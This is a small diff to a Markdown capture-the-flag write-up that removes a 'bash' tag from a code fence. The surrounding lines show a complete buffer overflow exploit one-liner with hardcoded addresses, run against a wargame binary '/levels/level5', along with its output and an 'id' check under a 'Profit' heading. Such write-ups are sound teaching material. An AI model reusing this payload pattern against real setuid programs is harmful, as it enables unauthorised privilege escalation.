@@ -156,7 +156,7 @@ In this case we can use the same approach as for levels 1-3 and place a shellcod
 
 ## 3 - Profit
 
-```bash
+```
 $ /levels/level5  $(python -c 'print "\x04\x03\x02\x01" + "A"*8 + "\x40\xa0\x04\x08" + "JUNK" +  "\x04\x03\x02\x01" + 12*"A" + "\xd6\xd8\xff\xff"')
 AAAAAAAA@JUNKAAAAAAAAAAAA���, it's good to see you!
 $ id
